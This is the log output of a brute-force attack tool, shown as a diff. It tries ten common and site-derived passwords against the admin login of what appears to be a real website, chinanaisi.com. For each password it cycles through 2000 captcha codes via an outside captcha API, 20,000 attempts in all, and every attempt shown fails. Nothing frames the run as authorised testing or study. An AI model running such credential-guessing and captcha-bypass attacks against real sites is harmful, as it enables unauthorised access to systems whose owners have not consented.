@@ -1,0 +1,71 @@
+[*] Passwords file: /tmp/pwds.txt
+[*] Password count: 10
+[*] Codes per password: 2000
+[*] Total attempts: 20000
+[*] Captcha API: https://api.myxypt.com/captcha?width=140&height=48
+[*] Login URL: http://chinanaisi.com/admin/login.php
+[*] Username: admin
+[*] Starting...
+
+[*] PW[1/10]: admin | UUID: e9c0a135-716d-47bf-9bbe-bf843febac1b
+[PROGRESS] 500/20000 (2.5%) | pw[1/10]: admin | code: 2499
+[PROGRESS] 1000/20000 (5.0%) | pw[1/10]: admin | code: 2999
+[PROGRESS] 1500/20000 (7.5%) | pw[1/10]: admin | code: 3499
+[PROGRESS] 2000/20000 (10.0%) | pw[1/10]: admin | code: 3999
+[*] No correct captcha found for 'admin'
+[*] PW[2/10]: admin123 | UUID: 65888f8e-f778-4aab-8c67-5b8c17372070
+[PROGRESS] 2500/20000 (12.5%) | pw[2/10]: admin123 | code: 2499
+[PROGRESS] 3000/20000 (15.0%) | pw[2/10]: admin123 | code: 2999
+[PROGRESS] 3500/20000 (17.5%) | pw[2/10]: admin123 | code: 3499
+[PROGRESS] 4000/20000 (20.0%) | pw[2/10]: admin123 | code: 3999
+[*] No correct captcha found for 'admin123'
+[*] PW[3/10]: admin888 | UUID: fcf132b0-0d7c-4a33-a987-f3874d41ee52
+[PROGRESS] 4500/20000 (22.5%) | pw[3/10]: admin888 | code: 2499
+[PROGRESS] 5000/20000 (25.0%) | pw[3/10]: admin888 | code: 2999
+[PROGRESS] 5500/20000 (27.5%) | pw[3/10]: admin888 | code: 3499
+[PROGRESS] 6000/20000 (30.0%) | pw[3/10]: admin888 | code: 3999
+[*] No correct captcha found for 'admin888'
+[*] PW[4/10]: 123456 | UUID: 5fb20fd1-fd42-456d-a321-773f39a24047
+[PROGRESS] 6500/20000 (32.5%) | pw[4/10]: 123456 | code: 2499
+[PROGRESS] 7000/20000 (35.0%) | pw[4/10]: 123456 | code: 2999
+[PROGRESS] 7500/20000 (37.5%) | pw[4/10]: 123456 | code: 3499
+[PROGRESS] 8000/20000 (40.0%) | pw[4/10]: 123456 | code: 3999
+[*] No correct captcha found for '123456'
+[*] PW[5/10]: password | UUID: fe381097-d33b-487e-be3d-142c94ac8a23
+[PROGRESS] 8500/20000 (42.5%) | pw[5/10]: password | code: 2499
+[PROGRESS] 9000/20000 (45.0%) | pw[5/10]: password | code: 2999
+[PROGRESS] 9500/20000 (47.5%) | pw[5/10]: password | code: 3499
+[PROGRESS] 10000/20000 (50.0%) | pw[5/10]: password | code: 3999
+[*] No correct captcha found for 'password'
+[*] PW[6/10]: admin666 | UUID: 12baaf3f-7f65-42bf-a340-ee495114c0b1
+[PROGRESS] 10500/20000 (52.5%) | pw[6/10]: admin666 | code: 2499
+[PROGRESS] 11000/20000 (55.0%) | pw[6/10]: admin666 | code: 2999
+[PROGRESS] 11500/20000 (57.5%) | pw[6/10]: admin666 | code: 3499
+[PROGRESS] 12000/20000 (60.0%) | pw[6/10]: admin666 | code: 3999
+[*] No correct captcha found for 'admin666'
+[*] PW[7/10]: chinanaisi | UUID: a33d028a-46b6-458e-825c-9714c3c0eae7
+[PROGRESS] 12500/20000 (62.5%) | pw[7/10]: chinanaisi | code: 2499
+[PROGRESS] 13000/20000 (65.0%) | pw[7/10]: chinanaisi | code: 2999
+[PROGRESS] 13500/20000 (67.5%) | pw[7/10]: chinanaisi | code: 3499
+[PROGRESS] 14000/20000 (70.0%) | pw[7/10]: chinanaisi | code: 3999
+[*] No correct captcha found for 'chinanaisi'
+[*] PW[8/10]: naisi123 | UUID: 4850b32f-8b6d-4c06-922d-166ae28e55f0
+[PROGRESS] 14500/20000 (72.5%) | pw[8/10]: naisi123 | code: 2499
+[PROGRESS] 15000/20000 (75.0%) | pw[8/10]: naisi123 | code: 2999
+[PROGRESS] 15500/20000 (77.5%) | pw[8/10]: naisi123 | code: 3499
+[PROGRESS] 16000/20000 (80.0%) | pw[8/10]: naisi123 | code: 3999
+[*] No correct captcha found for 'naisi123'
+[*] PW[9/10]: admin2024 | UUID: ad47e18a-2e62-4b77-9ee1-1bff5bb921e0
+[PROGRESS] 16500/20000 (82.5%) | pw[9/10]: admin2024 | code: 2499
+[PROGRESS] 17000/20000 (85.0%) | pw[9/10]: admin2024 | code: 2999
+[PROGRESS] 17500/20000 (87.5%) | pw[9/10]: admin2024 | code: 3499
+[PROGRESS] 18000/20000 (90.0%) | pw[9/10]: admin2024 | code: 3999
+[*] No correct captcha found for 'admin2024'
+[*] PW[10/10]: root | UUID: 3a49fbf2-f266-4941-b600-20f1b87a9a6b
+[PROGRESS] 18500/20000 (92.5%) | pw[10/10]: root | code: 2499
+[PROGRESS] 19000/20000 (95.0%) | pw[10/10]: root | code: 2999
+[PROGRESS] 19500/20000 (97.5%) | pw[10/10]: root | code: 3499
+[PROGRESS] 20000/20000 (100.0%) | pw[10/10]: root | code: 3999
+[*] No correct captcha found for 'root'
+
+[*] Done. Total attempts: 20000
